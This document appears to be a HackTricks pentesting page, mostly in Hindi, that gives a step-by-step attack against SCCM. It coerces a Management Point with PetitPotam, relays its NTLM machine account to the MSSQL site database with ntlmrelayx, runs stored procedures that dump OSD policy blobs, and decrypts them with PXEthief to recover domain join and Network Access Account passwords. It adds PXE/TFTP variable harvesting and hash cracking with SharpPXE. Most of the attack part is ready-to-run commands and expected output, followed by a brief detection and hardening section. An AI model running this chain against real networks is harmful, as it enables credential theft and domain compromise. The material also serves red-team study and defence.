# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
SMB/RPC पर प्रमाणीकृत करने के लिए एक **System Center Configuration Manager (SCCM) Management Point (MP)** को विवश करके और उस NTLM मशीन अकाउंट को **site database (MSSQL)** पर relay करके आप `smsdbrole_MP` / `smsdbrole_MPUserSvc` अधिकार प्राप्त कर लेते हैं। ये रोल आपको कुछ stored procedures कॉल करने देते हैं जो **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, आदि) प्रकट करते हैं। ये blobs hex-encoded/encrypted होते हैं पर इन्हें **PXEthief** से decode और decrypt किया जा सकता है, जिससे plaintext secrets मिलते हैं।

High-level chain:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. MP को प्रमाणीकृत कराने के लिए PetitPotam, PrinterBug, DFSCoerce, आदि का उपयोग करें।
4. SOCKS proxy के माध्यम से relayed **<DOMAIN>\\<MP-host>$** अकाउंट के रूप में `mssqlclient.py -windows-auth` से कनेक्ट करें।
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, आदि जैसे secrets बिना PXE या client को छुए recover हो जाते हैं।

---

## 1. Enumerating unauthenticated MP endpoints
MP ISAPI extension **GetAuth.dll** कई ऐसे पैरामीटर उजागर करता है जिन्हें authentication की आवश्यकता नहीं होती (जब तक साइट PKI-only न हो):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | साइट signing cert का public key + *x86* / *x64* **All Unknown Computers** devices के GUIDs लौटाता है। |
| `MPLIST` | साइट में हर Management-Point की सूची देता है। |
| `SITESIGNCERT` | Primary-Site signing certificate लौटाता है (LDAP के बिना साइट सर्वर की पहचान करने के लिए)। |

उन GUIDs को पकड़ लें जो बाद में DB क्वेरीज़ के लिए **clientID** के रूप में काम करेंगे:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
## 2. MP मशीन अकाउंट को MSSQL पर Relay करें
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
जब the coercion फायर होगा तो आपको कुछ इस तरह दिखाई देगा:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Stored procedures के माध्यम से OSD नीतियों की पहचान करें
SOCKS proxy (port 1080 by default) के माध्यम से कनेक्ट करें:
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB पर स्विच करें (3-अंकीय site code का उपयोग करें, जैसे `CM_001`)।

### 3.1  Unknown-Computer GUIDs खोजें (वैकल्पिक)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  असाइन की गई नीतियों को सूचीबद्ध करें
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
प्रत्येक पंक्ति में `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion` शामिल हैं।

निम्न नीतियों पर ध्यान दें:
* **NAAConfig**  – Network Access Account creds
* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
* **CollectionSettings** – Can contain run-as accounts

### 3.3  पूरा Body प्राप्त करें
यदि आपके पास पहले से `PolicyID` & `PolicyVersion` हैं तो आप clientID आवश्यकता को छोड़ सकते हैं, इसके लिए उपयोग करें:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANT: SSMS में “Maximum Characters Retrieved” (>65535) बढ़ाएँ, अन्यथा blob कट जाएगा।

---

## 4. blob को डिकोड और डिक्रिप्ट करें
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
रिकवर किए गए secrets का उदाहरण:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. प्रासंगिक SQL रोल्स और प्रक्रियाएँ
Relay होने पर login मैप होता है:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

ये रोल दर्जनों EXEC permissions उजागर करते हैं; इस attack में उपयोग किए जाने वाले प्रमुख हैं:

| Stored Procedure | उद्देश्य |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | एक `clientID` पर लागू नीतियों की सूची। |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | पूर्ण policy body लौटाता है। |
| `MP_GetListOfMPsInSiteOSD` | यह `MPKEYINFORMATIONMEDIA` path द्वारा लौटाया जाता है। |

You can inspect the full list with:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: PXE के लिए कॉन्फ़िगर किए गए Distribution Point को एक PXE boot request भेजें। proxyDHCP response से `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) और `SMSBoot\\x64\\pxe\\boot.bcd` जैसे boot paths और एक वैकल्पिक encrypted key blob का पता चलता है।
* **Retrieve boot artifacts via TFTP**: लौटाए गए paths का उपयोग करके TFTP पर `variables.dat` डाउनलोड करें (unauthenticated)। यह फ़ाइल छोटी होती है (कुछ KB) और इसमें encrypted media variables होते हैं।
* **Decrypt or crack**:
- यदि response में decryption key शामिल है, तो `variables.dat` को सीधे decrypt करने के लिए **SharpPXE** को वह key दें।
- यदि कोई key प्रदान नहीं किया गया है (PXE media किसी custom password से संरक्षित है), तो SharpPXE offline cracking के लिए एक **Hashcat-compatible** `$sccm$aes128$...` hash उत्सर्जित करता है। पासवर्ड मिलने के बाद फ़ाइल को decrypt करें।
* **Parse decrypted XML**: plaintext variables में SCCM deployment metadata होता है (**Management Point URL**, **Site Code**, media GUIDs, और अन्य identifiers)। SharpPXE इन्हें parse करता है और follow-on misuse के लिए GUID/PFX/site parameters पहले से भरे हुए एक ready-to-run **SharpSCCM** कमांड को प्रिंट करता है।
* **Requirements**: केवल PXE listener (UDP/4011) और TFTP तक नेटवर्क पहुंच आवश्यक है; किसी स्थानीय admin privileges की आवश्यकता नहीं है।

---

## 7. डिटेक्शन और हार्डनिंग
1. **Monitor MP logins** – किसी भी MP computer account के लॉगिन पर नज़र रखें जो उसके होस्ट से नहीं हो रहा है ≈ relay।
2. साइट database पर **Extended Protection for Authentication (EPA)** सक्षम करें (`PREVENT-14`)।
3. अनुपयोगी NTLM को अक्षम करें, SMB signing लागू करें, RPC को सीमित करें (उसी निवारक उपायों का प्रयोग जो `PetitPotam`/`PrinterBug` के खिलाफ होते हैं)।
4. MP ↔ DB संचार को IPSec / mutual-TLS से मजबूत बनाएं।
5. **Constrain PXE exposure** – UDP/4011 और TFTP के लिए firewall नियम बनाकर केवल trusted VLANs तक सीमित करें, PXE passwords आवश्यक करें, और TFTP पर `SMSBoot\\*\\pxe\\variables.dat` के downloads पर alert करें।

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
